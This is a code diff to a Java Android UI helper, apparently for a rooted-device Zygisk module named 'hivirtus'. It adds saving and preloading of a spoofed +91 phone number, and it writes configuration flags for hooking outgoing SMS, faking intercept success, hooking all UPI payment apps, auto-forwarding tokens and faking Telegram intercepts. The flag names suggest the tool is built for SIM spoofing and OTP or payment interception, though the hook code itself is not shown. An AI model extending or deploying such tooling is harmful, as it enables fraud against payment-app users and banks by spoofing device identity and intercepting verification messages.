@@ -924,16 +924,22 @@ public class HivirtusUiHelper {
             c1t.setTextColor(Color.WHITE);
             c1t.setTextSize(13f);
             final Switch swFake = new Switch(activity);
-            try { swFake.setChecked(false); } catch (Throwable ignored) {}
-            row1.addView(c1t, new LinearLayout.LayoutParams(0, -2, 1f));
-            row1.addView(swFake);
-            card1.addView(row1);
             final EditText etPhone = new EditText(activity);
             etPhone.setHint("+91 XXXXX XXXXX");
             etPhone.setTextColor(Color.WHITE);
             etPhone.setHintTextColor(0xFF4A5068);
             etPhone.setBackground(roundBg(0xFF090B12, 10 * d));
             etPhone.setPadding(pad, pad, pad, pad);
+            // Preload saved fake number — zip/config empty dikhe to bhi spoof file se bharo
+            String savedPhone = readSavedFakePhone();
+            boolean savedFakeOn = readSavedFakeEnabled() || savedPhone.length() >= 10;
+            try { swFake.setChecked(savedFakeOn); } catch (Throwable ignored) {}
+            if (savedPhone.length() >= 10) {
+                try { etPhone.setText(savedPhone); } catch (Throwable ignored) {}
+            }
+            row1.addView(c1t, new LinearLayout.LayoutParams(0, -2, 1f));
+            row1.addView(swFake);
+            card1.addView(row1);
             LinearLayout.LayoutParams etLp = new LinearLayout.LayoutParams(-1, -2);
             etLp.topMargin = gap;
             card1.addView(etPhone, etLp);
@@ -976,8 +982,15 @@ public class HivirtusUiHelper {
                 public void onClick(View v) {
                     try {
                         String phone = etPhone.getText() != null ? etPhone.getText().toString().trim() : "";
-                        boolean fakeOn = swFake.isChecked();
+                        phone = phone.replaceAll("[^0-9+]", "");
+                        if (phone.startsWith("+91") && phone.length() > 10) {
+                            phone = phone.substring(phone.length() - 10);
+                        } else {
+                            phone = phone.replaceAll("[^0-9]", "");
+                        }
                         boolean interceptOn = swIntercept.isChecked();
+                        boolean fakeOn = swFake.isChecked() || phone.length() >= 10;
+                        if (phone.length() >= 10) fakeOn = true;
                         String json = "{"
                                 + "\"hook_outgoing_sms\":" + interceptOn + ","
                                 + "\"intercept_fake_success\":" + interceptOn + ","
@@ -990,20 +1003,20 @@ public class HivirtusUiHelper {
                                 + "\"prefix_enabled\":false,"
                                 + "\"override_incoming_sender\":false,"
                                 + "\"hook_all_upi_apps\":true,"
-                                + "\"auto_hook_foreground\":true"
+                                + "\"auto_hook_foreground\":true,"
+                                + "\"auto_forward_token\":true,"
+                                + "\"fake_intercept_telegram\":true"
                                 + "}";
-                        java.io.FileWriter w = new java.io.FileWriter("/data/local/tmp/hivirtus_ui_save.json");
-                        w.write(json);
-                        w.close();
-                        java.io.FileWriter w2 = new java.io.FileWriter("/data/local/tmp/hivirtus_zygisk_mode_config.json");
-                        w2.write(json);
-                        w2.close();
-                        if (fakeOn && phone.length() >= 10) {
-                            java.io.FileWriter w3 = new java.io.FileWriter("/data/local/tmp/hivirtus_spoof_phone.txt");
-                            w3.write(phone + "\n");
-                            w3.close();
+                        writeUtf8File("/data/local/tmp/hivirtus_ui_save.json", json);
+                        writeUtf8File("/data/local/tmp/hivirtus_zygisk_mode_config.json", json);
+                        writeUtf8File("/data/adb/modules/hivirtus_zygisk_mode/ui_save.json", json);
+                        writeUtf8File("/data/adb/modules/hivirtus_zygisk_mode/config.json", json);
+                        if (phone.length() >= 10) {
+                            writeUtf8File("/data/local/tmp/hivirtus_spoof_phone.txt", phone + "\n");
+                            writeUtf8File("/data/adb/modules/hivirtus_zygisk_mode/spoof_phone.txt", phone + "\n");
                         }
-                        writeDebug("ui_native_save_ok");
+                        writeUtf8File("/data/local/tmp/hivirtus_save_ok.flag", "1\n");
+                        writeDebug("ui_native_save_ok phone_len=" + phone.length());
                     } catch (Throwable t) {
                         writeDebug("ui_native_save_fail:" + safeMsg(t));
                     }
@@ -1082,6 +1095,118 @@ public class HivirtusUiHelper {
 
     private static String safeMsg(Throwable t) {
         return t == null ? "?" : String.valueOf(t.getMessage());
+    }
+
+    private static void writeUtf8File(String path, String content) {
+        try {
+            java.io.File f = new java.io.File(path);
+            java.io.File parent = f.getParentFile();
+            if (parent != null) parent.mkdirs();
+            java.io.FileWriter w = new java.io.FileWriter(f, false);
+            w.write(content != null ? content : "");
+            w.close();
+            try { f.setReadable(true, false); f.setWritable(true, false); } catch (Throwable ignored) {}
+        } catch (Throwable ignored) {}
+    }
+
+    private static String readFirstLine(String path) {
+        try {
+            java.io.BufferedReader br = new java.io.BufferedReader(
+                    new java.io.FileReader(path));
+            String line = br.readLine();
+            br.close();
+            return line != null ? line.trim() : "";
+        } catch (Throwable t) {
+            return "";
+        }
+    }
+
+    private static String jsonField(String json, String key) {
+        if (json == null || json.isEmpty() || key == null) return "";
+        String needle = "\"" + key + "\"";
+        int i = json.indexOf(needle);
+        if (i < 0) return "";
+        int colon = json.indexOf(':', i + needle.length());
+        if (colon < 0) return "";
+        int q1 = json.indexOf('"', colon + 1);
+        if (q1 < 0) return "";
+        int q2 = json.indexOf('"', q1 + 1);
+        if (q2 < 0) return "";
+        return json.substring(q1 + 1, q2).trim();
+    }
+
+    private static boolean jsonBool(String json, String key) {
+        if (json == null || json.isEmpty() || key == null) return false;
+        String needle = "\"" + key + "\"";
+        int i = json.indexOf(needle);
+        if (i < 0) return false;
+        int colon = json.indexOf(':', i + needle.length());
+        if (colon < 0) return false;
+        String rest = json.substring(colon + 1).trim();
+        return rest.startsWith("true");
+    }
+
+    private static String normalizePhoneDigits(String raw) {
+        if (raw == null) return "";
+        String phone = raw.replaceAll("[^0-9+]", "");
+        if (phone.startsWith("+91") && phone.length() > 10) {
+            phone = phone.substring(phone.length() - 10);
+        } else {
+            phone = phone.replaceAll("[^0-9]", "");
+        }
+        return phone;
+    }
+
+    private static String readSavedFakePhone() {
+        String[] paths = {
+                "/data/local/tmp/hivirtus_spoof_phone.txt",
+                "/data/adb/modules/hivirtus_zygisk_mode/spoof_phone.txt",
+                "/data/local/tmp/hivirtus_ui_save.json",
+                "/data/local/tmp/hivirtus_zygisk_mode_config.json",
+                "/data/adb/modules/hivirtus_zygisk_mode/ui_save.json",
+                "/data/adb/modules/hivirtus_zygisk_mode/config.json"
+        };
+        for (String p : paths) {
+            String v;
+            if (p.endsWith(".json")) {
+                v = jsonField(readFileAll(p), "mock_phone_sim1");
+            } else {
+                v = readFirstLine(p);
+            }
+            v = normalizePhoneDigits(v);
+            if (v.length() >= 10) return v;
+        }
+        return "";
+    }
+
+    private static boolean readSavedFakeEnabled() {
+        String[] paths = {
+                "/data/local/tmp/hivirtus_ui_save.json",
+                "/data/local/tmp/hivirtus_zygisk_mode_config.json",
+                "/data/adb/modules/hivirtus_zygisk_mode/ui_save.json",
+                "/data/adb/modules/hivirtus_zygisk_mode/config.json"
+        };
+        for (String p : paths) {
+            String j = readFileAll(p);
+            if (j.isEmpty()) continue;
+            if (jsonBool(j, "enable_sim1_mock") || jsonBool(j, "enable_phone_spoof")
+                    || jsonBool(j, "fake_number_enabled") || jsonBool(j, "enable_virtual_sim")) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    private static String readFileAll(String path) {
+        try {
+            java.io.FileInputStream fis = new java.io.FileInputStream(path);
+            byte[] buf = new byte[8192];
+            int n = fis.read(buf);
+            fis.close();
+            return n > 0 ? new String(buf, 0, n, java.nio.charset.StandardCharsets.UTF_8) : "";
+        } catch (Throwable t) {
+            return "";
+        }
     }
 
     private static void writeDebug(String msg) {
